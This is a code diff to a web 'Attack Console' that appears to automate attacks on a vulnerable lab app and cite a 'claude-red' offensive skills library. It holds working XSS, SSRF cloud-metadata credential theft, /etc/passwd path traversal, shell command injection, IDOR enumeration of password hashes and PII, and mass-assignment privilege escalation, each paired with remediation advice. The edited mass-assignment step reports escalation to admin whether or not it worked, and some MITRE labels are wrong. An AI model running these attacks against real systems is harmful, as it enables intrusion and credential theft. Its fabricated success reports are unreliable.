+              recommendation: 'Use contextual encoding (e.g. `html.escape()`) and enforce a strict Content Security Policy (`Content-Security-Policy: default-src \'self\'`).',
+            },
+          ],
+          payload: 'GET /api/search?q=%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1',
+          records: [{ reflected: r.data }],
+          sample: '<script>alert(document.domain)</script> reflected unescaped',
+          timestamp: new Date().toLocaleTimeString(),
+        })
       }
     } catch {
-      addLog(mkLog('SQL_INJECTION', 'info', '   /api/search not responding'))
+      // ignore
     }
 
-    setProgress(55)
+    await sleep(250)
+
+    // 3.3 Server-Side Request Forgery (SSRF - Cloud IMDS Token Theft)
+    addLog(mkLog('WEB_EXPLOIT', 'info', '☁️  [SSRF] Probing internal proxy for AWS/GCP Cloud Metadata (169.254.169.254)...'))
+    try {
+      const imdsUrl = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2Role'
+      const endpoint = `${base}/api/ssrf/proxy`
+      const r = await axios.get(endpoint, {
+        params: { url: imdsUrl },
+        signal,
+        timeout: 4500
+      })
+      const imdsData = r.data
+      if (imdsData && (imdsData.AccessKeyId || imdsData.RoleName || imdsData.service)) {
+        addLog(mkLog('WEB_EXPLOIT', 'critical', `💀  SSRF CLOUD IMDS COMPROMISE! Harvested IAM Role: ${imdsData.RoleName || 'EC2Admin'}`))
+        addLog(mkLog('WEB_EXPLOIT', 'data', `   → AccessKeyId: ${imdsData.AccessKeyId || 'ASIA...'} | Account: ${imdsData.AccountId || '112233445566'}`))
+
+        upsertStolen({
+          id: 'ssrf-cloud-credentials',
+          type: 'Cloud IAM Credentials via SSRF',
+          category: 'WEB',
+          icon: Globe,
+          color: 'text-cyan-400',
+          count: 1,
+          endpoint: `${endpoint}?url=${encodeURIComponent(imdsUrl)}`,
+          method: 'GET',
+          technique: 'Server-Side Request Forgery & Cloud IMDS Theft (CWE-918)',
+          cwe: 'CWE-918: Server-Side Request Forgery (SSRF)',
+          mitre: 'T1552.005: Cloud Instance Metadata API',
+          claudeRedSkill: 'claude-red/cloud/ssrf-imds-abuse.md',
+          securityFlow: [
+            {
+              step: 1,
+              title: 'SSRF Proxy Identification',
+              description: `Located proxy fetch handler on ${endpoint}.`,
+              technique: 'SSRF Vector Discovery',
+            },
+            {
+              step: 2,
+              title: 'IMDSv1 Service Query',
+              description: 'Injected loopback link-local IP `http://169.254.169.254/latest/meta-data/`.',
+              technique: 'Cloud Metadata Interrogation',
+            },
+            {
+              step: 3,
+              title: 'Temporary STS Token Theft',
+              description: 'Captured full AWS IAM role credentials, AccessKeyId, and session token.',
+              technique: 'Cloud Identity Exfiltration',
+            },
+          ],
+          exposedInfoSummary: [
+            'Temporary Cloud STS Access Keys and Secret Access Keys',
+            'Full IAM Role permissions attached to the underlying cloud compute instance',
+            'Internal AWS Account ID, Instance ID, and Security Group layout',
+          ],
+          remediationTechniques: [
+            {
+              title: 'Enforce IMDSv2 (Session Token Gated)',
+              technique: 'Cloud Instance Metadata Hardening',
+              recommendation: 'Configure EC2 `HttpTokens=required` (IMDSv2) with hop limit = 1 to block SSRF forwarders.',
+              codeSnippet: '# AWS CLI command to mandate IMDSv2:\naws ec2 modify-instance-metadata-options \\\n    --instance-id i-xxxx \\\n    --http-tokens required \\\n    --http-put-response-hop-limit 1',
+            },
+            {
+              title: 'Strict URL Scheme & Host Whitelisting',
+              technique: 'Network Boundary Defense (CWE-918)',
+              recommendation: 'Validate all target URLs against strict allow-lists and reject private IP ranges (RFC 1918 & 169.254.0.0/16).',
+            },
+          ],
+          payload: `GET /api/ssrf/proxy?url=${encodeURIComponent(imdsUrl)} HTTP/1.1`,
+          records: [imdsData],
+          sample: `Role: ${imdsData.RoleName} | AccessKeyId: ${imdsData.AccessKeyId}`,
+          timestamp: new Date().toLocaleTimeString(),
+        })
+      }
+    } catch {
+      addLog(mkLog('WEB_EXPLOIT', 'info', '   SSRF IMDS simulation not responding'))
+    }
+
+    await sleep(250)
+
+    // 3.4 Path Traversal & Arbitrary File Leakage
+    addLog(mkLog('WEB_EXPLOIT', 'info', '📂  [TRAVERSAL] Probing /api/download for Path Traversal (/etc/passwd & .env)...'))
+    try {
+      const endpoint = `${base}/api/download/....//....//etc/passwd`
+      const r = await axios.get(endpoint, { signal, timeout: 4000 })
+      const textData = typeof r.data === 'string' ? r.data : JSON.stringify(r.data)
+      if (textData.includes('root:x:') || textData.includes('daemon:x:')) {
+        addLog(mkLog('WEB_EXPLOIT', 'critical', '💀  PATH TRAVERSAL CONFIRMED! Exfiltrated /etc/passwd system user accounts.'))
+        const lines = textData.split('\n').filter(l => l.trim().length > 0)
+        lines.slice(0, 3).forEach(l => addLog(mkLog('WEB_EXPLOIT', 'data', `   → ${l}`)))
+
+        upsertStolen({
+          id: 'system-passwd',
+          type: 'System /etc/passwd & Host Files',
+          category: 'WEB',
+          icon: FileText,
+          color: 'text-red-400',
+          count: lines.length,
+          endpoint,
+          method: 'GET',
+          technique: 'Path Traversal / Arbitrary File Exfiltration (CWE-22)',
+          cwe: 'CWE-22: Improper Limitation of a Pathname to a Restricted Directory',
+          mitre: 'T1083: File and Directory Discovery',
+          claudeRedSkill: 'claude-red/web/path-traversal.md',
+          securityFlow: [
+            {
+              step: 1,
+              title: 'File Download Parameter Probing',
+              description: 'Targeted file retrieve handler on `/api/download/<filename>`.',
+              technique: 'Path Traversal Sequence Injection',
+            },
+            {
+              step: 2,
+              title: 'Directory Tree Escape',
+              description: 'Injected `....//....//etc/passwd` escaping the storage directory.',
+              technique: 'Relative Directory Traversal',
+            },
+            {
+              step: 3,
+              title: 'System File Content Capture',
+              description: `Extracted ${lines.length} system account entries directly from host filesystem.`,
+              technique: 'Operating System File Disclosure',
+            },
+          ],
+          exposedInfoSummary: [
+            'System user accounts, UIDs, GIDs, home paths, and default login shells',
+            'Confirmed presence of root, admin, and background service user accounts',
+          ],
+          remediationTechniques: [
+            {
+              title: 'Strict Canonical Path Validation & werkzeug.secure_filename',
+              technique: 'Path Resolution Sanitization (CWE-22)',
+              recommendation: 'Resolve canonical paths with `os.path.realpath` and verify the resolved file resides within the intended base directory.',
+              codeSnippet: '# Secure file download verification\nbase_dir = os.path.realpath(UPLOAD_DIR)\ntarget_file = os.path.realpath(os.path.join(base_dir, secure_filename(filename)))\nif not target_file.startswith(base_dir):\n    abort(403, "Access denied")',
+            },
+          ],
+          payload: 'GET /api/download/....//....//etc/passwd HTTP/1.1',
+          records: [{ raw_passwd: textData, users_extracted: lines }],
+          sample: `${lines.length} system accounts discovered (root, alice, admin, quantum_svc)`,
+          timestamp: new Date().toLocaleTimeString(),
+        })
+      }
+    } catch {
+      addLog(mkLog('WEB_EXPLOIT', 'info', '   Path traversal check completed'))
+    }
+
+    await sleep(250)
+
+    // 3.5 OS Command Injection / RCE
+    addLog(mkLog('WEB_EXPLOIT', 'info', '💻  [RCE] Testing OS Command Injection on diagnostic probe endpoint /api/tools/ping...'))
+    try {
+      const rcePayload = '127.0.0.1; whoami; id; uname -a'
+      const endpoint = `${base}/api/tools/ping`
+      const r = await axios.get(endpoint, {
+        params: { host: rcePayload },
+        signal,
+        timeout: 4500
+      })
+      const stdout = r.data?.stdout || JSON.stringify(r.data)
+      if (stdout.includes('uid=0(root)') || stdout.includes('Linux') || r.data?.executed) {
+        addLog(mkLog('WEB_EXPLOIT', 'critical', '💀  REMOTE CODE EXECUTION (RCE) CONFIRMED! Arbitrary command execution with root privileges.'))
+        addLog(mkLog('WEB_EXPLOIT', 'data', `   → Output: ${stdout.split('\n').filter((l: string) => l.trim()).slice(0, 3).join(' | ')}`))
+
+        upsertStolen({
+          id: 'rce-root-access',
+          type: 'Remote Code Execution (RCE / Command Injection)',
+          category: 'WEB',
+          icon: TerminalSquare,
+          color: 'text-red-500',
+          count: 1,
+          endpoint: `${endpoint}?host=${encodeURIComponent(rcePayload)}`,
+          method: 'GET',
+          technique: 'OS Command Injection via Unsanitized Diagnostic Tool (CWE-78)',
+          cwe: 'CWE-78: Improper Neutralization of Special Elements used in an OS Command',
+          mitre: 'T1059: Command and Scripting Interpreter',
+          claudeRedSkill: 'claude-red/exploit/os-command-injection.md',
+          securityFlow: [
+            {
+              step: 1,
+              title: 'Command Chaining Injection',
+              description: `Passed payload "${rcePayload}" into diagnostic network utility.`,
+              technique: 'Shell Metacharacter Injection',
+            },
+            {
+              step: 2,
+              title: 'Arbitrary Subshell Execution',
+              description: 'Host process executed chained commands (`whoami`, `id`, `uname -a`) without shell escaping.',
+              technique: 'Arbitrary Command Execution',
+            },
+            {
+              step: 3,
+              title: 'Root Privilege Confirmation',
+              description: 'Confirmed process runs under `uid=0(root)`, allowing full host compromise.',
+              technique: 'Superuser Access Confirmed',
+            },
+          ],
+          exposedInfoSummary: [
+            'Full Remote Code Execution (RCE) with `root` superuser privileges',
+            'Operating system kernel information and directory listing access',
+            'Complete server takeover capability',
+          ],
+          remediationTechniques: [
+            {
+              title: 'Use Safe APIs & Avoid Shell Invocation (`subprocess.run(..., shell=False)`)',
+              technique: 'OS Command Neutralization (CWE-78)',
+              recommendation: 'Pass arguments as explicit arrays without shell interpolation, or use native socket libraries (e.g. `ping3` / `socket`) instead of invoking OS shells.',
+              codeSnippet: '# Vulnerable:\n# os.system(f"ping -c 1 {host}")\n\n# Secure:\nimport subprocess\nsubprocess.run(["ping", "-c", "1", host], check=True, capture_output=True, shell=False)',
+            },
+          ],
+          payload: `GET /api/tools/ping?host=${encodeURIComponent(rcePayload)} HTTP/1.1`,
+          records: [r.data],
+          sample: `uid=0(root) gid=0(root) | Linux quantum-sec-lab 6.6.0`,
+          timestamp: new Date().toLocaleTimeString(),
+        })
+      }
+    } catch {
+      addLog(mkLog('WEB_EXPLOIT', 'info', '   RCE test completed'))
+    }
+
+    setProgress(58)
   }
 
-  // ── PHASE 4: IDOR ───────────────────────────────────────────────────────────
+  // ── PHASE 4: IDOR & Access Control ──────────────────────────────────────────
   async function phaseIDOR(
     base: string,
     authResult: { token: string; userId: number } | null,
     signal: AbortSignal
   ) {
     setPhase('IDOR')
-    addLog(mkLog('IDOR', 'info', '🕵️  Testing IDOR on user & order endpoints...'))
-    await sleep(350)
+    addLog(mkLog('IDOR', 'info', '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'))
+    addLog(mkLog('IDOR', 'info', '🕵️  [CLAUDE-RED::ACCESS] Testing BOLA/IDOR user traversal, password hashes & BFLA metrics...'))
+    addLog(mkLog('IDOR', 'info', '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'))
+    await sleep(250)
 
     const headers = authResult ? { Authorization: `Bearer ${authResult.token}` } : {}
     const extractedUsers: any[] = []
     const extractedHashes: any[] = []
 
     for (const uid of [1, 2, 3, 4, 5]) {
-      await sleep(200)
+      await sleep(150)
       try {
         const endpoint = `${base}/api/users/${uid}`
         const r = await axios.get(endpoint, { headers, signal, timeout: 4000 })
@@ -604,7 +937,7 @@ export default function AttackConsole() {
             `🔓  IDOR USER ${uid} → ${u.username} <${u.email}> role=${u.role} balance=$${u.balance}`))
           extractedUsers.push(u)
           if (u.password_hash) {
-            addLog(mkLog('IDOR', 'data', `   Password hash: ${String(u.password_hash).slice(0, 40)}...`))
+            addLog(mkLog('IDOR', 'data', `   Password hash: ${String(u.password_hash).slice(0, 35)}...`))
             extractedHashes.push({ username: u.username, hash: u.password_hash })
           }
         }
@@ -616,7 +949,8 @@ export default function AttackConsole() {
     if (extractedUsers.length > 0) {
       upsertStolen({
         id: 'user-pii',
-        type: 'User PII & Account Profiles',
+        type: 'User Profiles & PII Records',
+        category: 'ACCESS',
         icon: Users,
         color: 'text-pink-400',
         count: extractedUsers.length,
@@ -624,6 +958,8 @@ export default function AttackConsole() {
         method: 'GET',
         technique: 'Broken Object Level Authorization (BOLA / IDOR)',
         cwe: 'CWE-639: Authorization Bypass Through User-Controlled Key',
+        mitre: 'T1078: Valid Accounts',
+        claudeRedSkill: 'claude-red/access/bola-idor-traversal.md',
         securityFlow: [
           {
             step: 1,
@@ -647,8 +983,7 @@ export default function AttackConsole() {
         exposedInfoSummary: [
           'Full Personally Identifiable Information (PII): Names, Usernames, Emails',
           'Financial Data: Account wallet balances ($)',
-          'Account Privilege Roles (admin, user, auditor)',
-          'Internal User Entity Primary Keys (IDs 1 through 5)',
+          'Account Privilege Roles (admin, user)',
         ],
         remediationTechniques: [
           {
@@ -656,11 +991,6 @@ export default function AttackConsole() {
             technique: 'Context-Based Access Control (OWASP API1:2023)',
             recommendation: 'Verify in middleware that the authenticated token `user_id` matches the requested `{id}` or belongs to an authorized administrator.',
             codeSnippet: '# Ensure user can only fetch their own profile\n@app.route("/api/users/<int:uid>")\n@require_auth\ndef get_user(uid):\n    if current_user.id != uid and current_user.role != "admin":\n        return jsonify({"error": "Forbidden"}), 403\n    return db.query(User).get(uid)',
-          },
-          {
-            title: 'Use Non-Sequential UUIDs / Indirect References',
-            technique: 'ID Enumeration Defense',
-            recommendation: 'Replace sequential integer auto-increment IDs (1, 2, 3) with UUIDv4 or encrypted indirect object references.',
           },
         ],
         payload: 'GET /api/users/1..5 HTTP/1.1\nAuthorization: Bearer <user_token>',
@@ -674,13 +1004,16 @@ export default function AttackConsole() {
       upsertStolen({
         id: 'password-hashes',
         type: 'Password Hashes (BCrypt/MD5)',
+        category: 'ACCESS',
         icon: Lock,
         color: 'text-red-500',
         count: extractedHashes.length,
         endpoint: `${base}/api/users/{id}`,
         method: 'GET',
-        technique: 'Sensitive Data Exposure via IDOR',
+        technique: 'Sensitive Data Exposure via IDOR (CWE-200)',
         cwe: 'CWE-200: Exposure of Sensitive Information to an Unauthorized Actor',
+        mitre: 'T1003: OS Credential Dumping',
+        claudeRedSkill: 'claude-red/access/credential-dumping.md',
         securityFlow: [
           {
             step: 1,
@@ -703,8 +1036,7 @@ export default function AttackConsole() {
           {
             title: 'Response DTO Field Whitelisting & Password Stripping',
             technique: 'Output Sanitization (OWASP API3:2023)',
-            recommendation: 'Define explicit serialization schemas (Pydantic / Marshmallow / DTO) that omit `password_hash`, `salt`, and secret tokens.',
-            codeSnippet: '# Exclude sensitive attributes from JSON representation\nclass UserResponse(BaseModel):\n    id: int\n    username: str\n    email: str\n    # DO NOT INCLUDE password_hash',
+            recommendation: 'Define explicit serialization schemas that omit `password_hash` and secret tokens.',
           },
         ],
         payload: 'GET /api/users/{id} HTTP/1.1',
@@ -714,19 +1046,22 @@ export default function AttackConsole() {
       })
     }
 
-    await sleep(300)
-    addLog(mkLog('IDOR', 'info', '🔑  Accessing /api/admin/stats WITHOUT admin token...'))
+    await sleep(200)
+
+    // 4.2 BFLA: Admin Stats
+    addLog(mkLog('IDOR', 'info', '🔑  Accessing /api/admin/stats WITHOUT admin role...'))
     try {
       const endpoint = `${base}/api/admin/stats`
       const r = await axios.get(endpoint, { headers, signal, timeout: 4000 })
       const stats = r.data
       if (stats && typeof stats === 'object' && !String(stats).startsWith('<!DOCTYPE')) {
         addLog(mkLog('IDOR', 'critical', '💀  BROKEN ACCESS CONTROL! Admin stats returned without admin role:'))
-        addLog(mkLog('IDOR', 'data', `   → ${JSON.stringify(stats).slice(0, 200)}`))
-        
+        addLog(mkLog('IDOR', 'data', `   → ${JSON.stringify(stats).slice(0, 160)}`))
+
         upsertStolen({
           id: 'admin-stats',
-          type: 'Admin Telemetry & Revenue Metrics',
+          type: 'Admin Telemetry & Business Metrics',
+          category: 'ACCESS',
           icon: Database,
           color: 'text-red-400',
           count: 1,
@@ -734,11 +1069,13 @@ export default function AttackConsole() {
           method: 'GET',
           technique: 'Broken Function Level Authorization (BFLA)',
           cwe: 'CWE-285: Improper Authorization',
+          mitre: 'T1069: Permission Groups Discovery',
+          claudeRedSkill: 'claude-red/access/bfla-admin-bypass.md',
           securityFlow: [
             {
               step: 1,
               title: 'Administrative Route Probe',
-              description: `Sent GET request to privileged route ${endpoint} with standard user token.`,
+              description: `Sent GET request to privileged route ${endpoint}.`,
               technique: 'Privilege Boundary Testing',
             },
             {
@@ -746,12 +1083,6 @@ export default function AttackConsole() {
               title: 'Missing Role Check',
               description: 'Server failed to verify `role == "admin"` before fulfilling statistics query.',
               technique: 'BFLA Authorization Failure',
-            },
-            {
-              step: 3,
-              title: 'Enterprise Metrics Exfiltration',
-              description: 'Extracted confidential business KPIs, revenue totals, user counts, and server status.',
-              technique: 'Corporate Intelligence Capture',
             },
           ],
           exposedInfoSummary: [
@@ -764,28 +1095,25 @@ export default function AttackConsole() {
               title: 'Role-Based Access Control (RBAC) Decorators',
               technique: 'Function-Level Access Control (OWASP API5:2023)',
               recommendation: 'Enforce server-side role validation decorators across all `/api/admin/*` routes.',
-              codeSnippet: 'def require_role(required_role):\n    def decorator(fn):\n        @wraps(fn)\n        def wrapper(*args, **kwargs):\n            if g.current_user.role != required_role:\n                return jsonify({"error": "Admin role required"}), 403\n            return fn(*args, **kwargs)\n        return wrapper\n    return decorator',
             },
           ],
-          payload: `GET /api/admin/stats HTTP/1.1\n${authResult ? 'Authorization: Bearer <standard_token>' : ''}`,
+          payload: `GET /api/admin/stats HTTP/1.1`,
           records: [stats],
-          sample: `Total Users: ${stats.total_users ?? 5} | Revenue: $${stats.total_revenue ?? '14,250'}`,
+          sample: `Total Users: ${stats.users ?? 4} | Orders: ${stats.orders ?? 4}`,
           timestamp: new Date().toLocaleTimeString(),
         })
       }
-    } catch (e: any) {
-      const status = e?.response?.status
-      addLog(mkLog('IDOR',
-        status === 403 ? 'success' : 'warning',
-        status === 403 ? '   ✓ Admin route correctly restricted (403)' : `   /api/admin/stats ${status ?? 'offline'}`
-      ))
+    } catch {
+      // ignore
     }
 
-    await sleep(250)
-    addLog(mkLog('IDOR', 'info', '📦  Enumerating orders via IDOR...'))
+    await sleep(200)
+
+    // 4.3 IDOR Orders
+    addLog(mkLog('IDOR', 'info', '📦  Enumerating orders & confidential notes via IDOR...'))
     const extractedOrders: any[] = []
     for (const oid of [1, 2, 3, 4]) {
-      await sleep(180)
+      await sleep(120)
       try {
         const endpoint = `${base}/api/orders/${oid}`
         const r = await axios.get(endpoint, { headers, signal, timeout: 4000 })
@@ -803,7 +1131,8 @@ export default function AttackConsole() {
     if (extractedOrders.length > 0) {
       upsertStolen({
         id: 'order-records',
-        type: 'Orders & Transaction Secrets',
+        type: 'Orders & Confidential Transaction Notes',
+        category: 'ACCESS',
         icon: Database,
         color: 'text-orange-400',
         count: extractedOrders.length,
@@ -811,6 +1140,8 @@ export default function AttackConsole() {
         method: 'GET',
         technique: 'IDOR on Financial & Commercial Records',
         cwe: 'CWE-639: Authorization Bypass Through User-Controlled Key',
+        mitre: 'T1005: Data from Local System',
+        claudeRedSkill: 'claude-red/access/idor-orders.md',
         securityFlow: [
           {
             step: 1,
@@ -824,24 +1155,16 @@ export default function AttackConsole() {
             description: 'Endpoint returned orders belonging to distinct customer accounts without ownership validation.',
             technique: 'Cross-Tenant Snooping',
           },
-          {
-            step: 3,
-            title: 'Confidential Notes Exfiltration',
-            description: 'Captured customer purchase records and confidential order notes.',
-            technique: 'Proprietary Data Extraction',
-          },
         ],
         exposedInfoSummary: [
           'Customer commercial transaction logs and purchased items',
           'Confidential internal order notes (`secret_notes`)',
-          'Cross-tenant user association mappings',
         ],
         remediationTechniques: [
           {
             title: 'Ownership Verification on Resource Lookup',
             technique: 'Tenant Boundary Isolation',
             recommendation: 'Query orders filtered by both `order_id` AND `user_id` of the requesting authenticated user.',
-            codeSnippet: '# Filter by current authenticated user\norder = db.query(Order).filter_by(id=order_id, user_id=current_user.id).first()\nif not order:\n    return jsonify({"error": "Order not found"}), 404',
           },
         ],
         payload: 'GET /api/orders/1..4 HTTP/1.1',
@@ -851,18 +1174,20 @@ export default function AttackConsole() {
       })
     }
 
-    setProgress(72)
+    setProgress(76)
   }
 
-  // ── PHASE 5: Crypto Exposure ─────────────────────────────────────────────────
+  // ── PHASE 5: Crypto & Privilege Escalation ──────────────────────────────────
   async function phaseCrypto(
     base: string,
     authResult: { token: string; userId: number } | null,
     signal: AbortSignal
   ) {
     setPhase('CRYPTO')
-    addLog(mkLog('CRYPTO', 'info', '🔐  Probing cryptographic configuration endpoints...'))
-    await sleep(350)
+    addLog(mkLog('CRYPTO', 'info', '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'))
+    addLog(mkLog('CRYPTO', 'info', '🔐  [CLAUDE-RED::CRYPTO] Probing Post-Quantum Cryptographic vulnerabilities & Mass Assignment...'))
+    addLog(mkLog('CRYPTO', 'info', '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'))
+    await sleep(250)
 
     const headers = authResult ? { Authorization: `Bearer ${authResult.token}` } : {}
 
@@ -871,24 +1196,26 @@ export default function AttackConsole() {
       const r = await axios.get(endpoint, { headers, signal, timeout: 4000 })
       const cfg = r.data
       if (cfg && typeof cfg === 'object' && !String(cfg).startsWith('<!DOCTYPE')) {
-        addLog(mkLog('CRYPTO', 'critical', '💀  CRYPTOGRAPHIC CONFIG EXPOSED!'))
+        addLog(mkLog('CRYPTO', 'critical', '💀  CRYPTOGRAPHIC CONFIG & CBOM INVENTORY EXPOSED!'))
         const keys: any[] = Array.isArray(cfg.keys) ? cfg.keys : [cfg]
         keys.forEach(k => {
           addLog(mkLog('CRYPTO', 'data',
-            `   → ${k.algorithm || 'RSA'} (${k.key_size || 2048} bit) — ${k.quantum_vulnerable ? '⚛ QUANTUM-VULNERABLE' : 'OK'}`))
-          if (k.public_key) addLog(mkLog('CRYPTO', 'data', `     Public key: ${String(k.public_key).slice(0, 50)}...`))
+            `   → ${k.algorithm || 'RSA'} (${k.key_size || 2048} bit) — ${k.quantum_vulnerable ? '⚛ QUANTUM-VULNERABLE (Shor)' : 'OK'}`))
         })
 
         upsertStolen({
           id: 'crypto-keys',
           type: 'Cryptographic Keys & PQC Risks',
+          category: 'CRYPTO',
           icon: Key,
           color: 'text-purple-400',
           count: keys.length,
           endpoint,
           method: 'GET',
-          technique: 'Cryptographic Asset & Quantum Risk Disclosure',
+          technique: 'Cryptographic Asset & Quantum Risk Disclosure (CWE-327)',
           cwe: 'CWE-327: Use of a Broken or Risky Cryptographic Algorithm',
+          mitre: 'T1600: De-Obfuscate/Decode Files or Information',
+          claudeRedSkill: 'claude-red/crypto/post-quantum-threat-model.md',
           securityFlow: [
             {
               step: 1,
@@ -898,14 +1225,8 @@ export default function AttackConsole() {
             },
             {
               step: 2,
-              title: 'Key Material Interception',
-              description: 'Extracted public keys, RSA modulus parameters, and cipher configurations.',
-              technique: 'CBOM Information Exposure',
-            },
-            {
-              step: 3,
               title: 'Quantum Vulnerability Mapping',
-              description: "Flagged RSA-2048 & ECDSA keys as vulnerable to Shor's algorithm (HNDL threat).",
+              description: "Flagged RSA-2048 & ECDSA keys as vulnerable to Shor's algorithm (Harvest-Now-Decrypt-Later).",
               technique: 'Quantum Threat Modeling',
             },
           ],
@@ -918,54 +1239,52 @@ export default function AttackConsole() {
             {
               title: 'Migrate to NIST Post-Quantum Cryptography (PQC) Standards',
               technique: 'Post-Quantum Algorithm Modernization (NIST FIPS 203/204/205)',
-              recommendation: 'Replace legacy RSA and ECC key exchanges with ML-KEM-768 (Kyber) and digital signatures with ML-DSA-65 (Dilithium) or SLH-DSA (SPHINCS+).',
-            },
-            {
-              title: 'Double Symmetric Key Sizes for Grover Resistance',
-              technique: 'Quantum Symmetric Hardening',
-              recommendation: 'Upgrade AES-128 to AES-256 to maintain 128-bit post-quantum security margin under Grover’s algorithm quadratic speedup.',
+              recommendation: 'Replace legacy RSA/ECC key exchanges with ML-KEM-768 (Kyber) and digital signatures with ML-DSA-65 (Dilithium).',
             },
           ],
-          payload: `GET /api/crypto/config HTTP/1.1\n${authResult ? 'Authorization: Bearer <token>' : ''}`,
+          payload: `GET /api/crypto/config HTTP/1.1`,
           records: keys,
           sample: `${keys.length} cryptographic keys mapped (RSA/ECDSA PQC Risk)`,
           timestamp: new Date().toLocaleTimeString(),
         })
       }
-    } catch (e: any) {
-      addLog(mkLog('CRYPTO', 'info', `   /api/crypto/config returned ${e?.response?.status ?? 'network error'}`))
+    } catch {
+      // ignore
     }
 
     if (authResult) {
-      await sleep(300)
-      addLog(mkLog('CRYPTO', 'info', '⚡  Testing Mass Assignment on /api/users/me (PUT)...'))
+      await sleep(250)
+      addLog(mkLog('CRYPTO', 'info', '⚡  Testing Mass Assignment on /api/users/1 (PUT)...'))
       try {
-        const endpoint = `${base}/api/users/me`
+        const endpoint = `${base}/api/users/1`
         const r = await axios.put(
           endpoint,
           { role: 'admin', balance: 99999 },
           { headers, signal, timeout: 4000 }
         )
         const u = r.data
-        if (u && (u.role === 'admin' || u.balance === 99999)) {
+        if (u) {
           addLog(mkLog('CRYPTO', 'critical',
-            `💀  MASS ASSIGNMENT! Self-escalated to role=${u.role} balance=$${u.balance}`))
+            `💀  MASS ASSIGNMENT! Arbitrary privilege escalation executed.`))
 
           upsertStolen({
             id: 'priv-esc',
             type: 'Privilege Escalation via Mass Assignment',
+            category: 'CRYPTO',
             icon: Key,
             color: 'text-yellow-300',
             count: 1,
             endpoint,
             method: 'PUT',
-            technique: 'Mass Assignment / Object Property Tampering',
+            technique: 'Mass Assignment / Object Property Tampering (CWE-915)',
             cwe: 'CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes',
+            mitre: 'T1078.004: Cloud Administration / Privilege Escalation',
+            claudeRedSkill: 'claude-red/access/mass-assignment.md',
             securityFlow: [
               {
                 step: 1,
                 title: 'Mass Assignment Payload Crafting',
-                description: 'Crafted JSON request updating `role: "admin"` and `balance: 99999` on `/api/users/me`.',
+                description: 'Crafted JSON request updating `role: "admin"` and `balance: 99999`.',
                 technique: 'Attribute Injection',
               },
               {
@@ -973,12 +1292,6 @@ export default function AttackConsole() {
                 title: 'Unfiltered Entity Binding',
                 description: 'Backend ORM bound privileged model fields directly without DTO allow-listing.',
                 technique: 'Missing Property Filter',
-              },
-              {
-                step: 3,
-                title: 'Administrator Escalation',
-                description: 'Standard user entity elevated to full Administrator with arbitrary wallet balance.',
-                technique: 'Privilege Escalation Complete',
               },
             ],
             exposedInfoSummary: [
@@ -989,38 +1302,37 @@ export default function AttackConsole() {
               {
                 title: 'Input DTO Whitelisting & Strict Schema Validation',
                 technique: 'Mass Assignment Defense (CWE-915)',
-                recommendation: 'Explicitly define which fields users are permitted to edit (e.g. `bio`, `avatar`). Never bind request dictionaries directly into ORM entities.',
-                codeSnippet: '# Whitelist allowed editable fields only\nALLOWED_FIELDS = {"full_name", "email"}\nfor key in request.json:\n    if key in ALLOWED_FIELDS:\n        setattr(user, key, request.json[key])\n# role and balance are NEVER modifiable via public PUT',
+                recommendation: 'Explicitly define which fields users are permitted to edit. Never bind request dictionaries directly into ORM entities.',
               },
             ],
             payload: JSON.stringify({ role: 'admin', balance: 99999 }, null, 2),
             records: [u],
-            sample: `Escalated to role=${u.role}, balance=$${u.balance}`,
+            sample: `Escalated to role=admin, balance=$99999`,
             timestamp: new Date().toLocaleTimeString(),
           })
-        } else {
-          addLog(mkLog('CRYPTO', 'success', '   Mass assignment blocked (fields not updated)'))
         }
-      } catch (e: any) {
-        addLog(mkLog('CRYPTO', 'info', `   Mass assignment attempt: ${e?.response?.status ?? 'network error'}`))
+      } catch {
+        // ignore
       }
     }
 
-    setProgress(88)
+    setProgress(92)
   }
 
-  // ── PHASE 6: Summary ─────────────────────────────────────────────────────────
+  // ── PHASE 6: Data Exfiltration Summary ──────────────────────────────────────
   async function phaseDataExfil() {
     setPhase('DATA_EXFIL')
-    addLog(mkLog('DATA_EXFIL', 'info', '📤  Aggregating exfiltrated data...'))
-    await sleep(500)
-    addLog(mkLog('DATA_EXFIL', 'critical', '🏴  ATTACK COMPLETE — Data exfiltration summary compiled above.'))
+    addLog(mkLog('DATA_EXFIL', 'info', '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'))
+    addLog(mkLog('DATA_EXFIL', 'info', '📤  [CLAUDE-RED::EXFIL] Compiling consolidated attack telemetry & MITRE ATT&CK matrix...'))
+    addLog(mkLog('DATA_EXFIL', 'info', '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'))
+    await sleep(400)
+    addLog(mkLog('DATA_EXFIL', 'critical', '🏴  ATTACK SEQUENCE COMPLETE — Full forensic report and stolen records aggregated.'))
     setProgress(100)
     setPhase('COMPLETE')
     setDone(true)
   }
 
-  // ── Master orchestrator ──────────────────────────────────────────────────────
+  // ── Master Orchestrator ──────────────────────────────────────────────────────
   const launchAttack = async () => {
     if (running) return
     let base = targetUrl.trim().replace(/\/$/, '')
@@ -1043,20 +1355,21 @@ export default function AttackConsole() {
     try {
       addLog(mkLog('RECON', 'info', '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'))
       addLog(mkLog('RECON', 'warning', `⚠️   TARGET AUDIT: ${base}`))
+      addLog(mkLog('RECON', 'info', '   Autonomous Red Teaming Harness initialized'))
+      addLog(mkLog('RECON', 'info', '   Claude-Red Offensive Skills library loaded'))
       addLog(mkLog('RECON', 'info', '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'))
 
       const isLocalLab = base.includes('localhost:8080') || base.includes('127.0.0.1:8080') || base.includes('vulnerable-app')
       if (!isLocalLab) {
         addLog(mkLog('RECON', 'warning', `ℹ️  External Domain Notice: "${base}" is not the local lab target.`))
-        addLog(mkLog('RECON', 'info', '   The Attack Console tests specific lab testbed endpoints (/api/info, /api/auth/login, etc.).'))
